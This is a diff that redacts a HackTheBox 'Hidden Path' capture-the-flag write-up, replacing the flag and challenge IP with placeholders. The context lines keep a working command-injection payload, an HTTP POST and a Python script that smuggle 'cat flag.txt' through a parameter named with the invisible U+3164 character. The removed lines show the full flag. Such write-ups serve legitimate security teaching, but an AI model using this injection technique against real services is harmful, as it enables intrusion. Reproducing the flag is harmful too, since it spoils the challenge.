@@ -8,7 +8,7 @@
 
 **Keywords:** unicode homoglyph, command injection, U+3164, invisible character, nodejs, express, destructuring, variable reference, hangul jungseong filler, array injection, system check endpoint, misc easy 1000 points  
 **Tags:** #javascript #nodejs #command-injection #unicode #homoglyph #u3164 #express #invisible-character #misc-easy #hackthebox #ctf  
-**Flag:** `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}`  
+**Flag:** `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}`  
 **Search Terms:** unicode injection exploit, U+3164 vulnerability, invisible character attack, nodejs command injection, express destructuring bypass, hackthebox hidden path walkthrough, hackthebox hidden path solution, hiddenpath htb, hidden-path ctf, hangul jungseong filler exploit
 
 - **Name**: Hidden Path
@@ -23,7 +23,7 @@ Legends speak of the infamous Kamara-Heto, a black-hat hacker of old who rose to
 
 ## Target Information
 
-- **IP**: 154.57.164.69
+- **IP**: <CHALLENGE_IP>
 - **Port**: 30224
 - **Type**: Command Injection via Unicode Homoglyph
 
@@ -80,7 +80,7 @@ When `choice=6` is sent, `commands[6]` evaluates to the current value of the inv
 **Payload**:
 ```http
 POST /server_status HTTP/1.1
-Host: 154.57.164.69:30224
+Host: <CHALLENGE_IP>:30224
 Content-Type: application/x-www-form-urlencoded
 
 choice=6&ㅤ=cat flag.txt
@@ -103,12 +103,12 @@ invisible = '\u3164'
 payload = f'choice=6&{urllib.parse.quote(invisible)}=cat flag.txt'
 
 r = requests.post(
-    'http://154.57.164.69:30224/server_status',
+    'http://<CHALLENGE_IP>:30224/server_status',
     data=payload,
     headers={'Content-Type': 'application/x-www-form-urlencoded'}
 )
 print(r.text)
-# Output: HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}
+# Output: HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}
 ```
 
 ### How It Works
@@ -131,7 +131,7 @@ print(r.text)
 ## Flag
 
 ```
-HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}
+HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}
 ```
 
 ## Key Takeaways
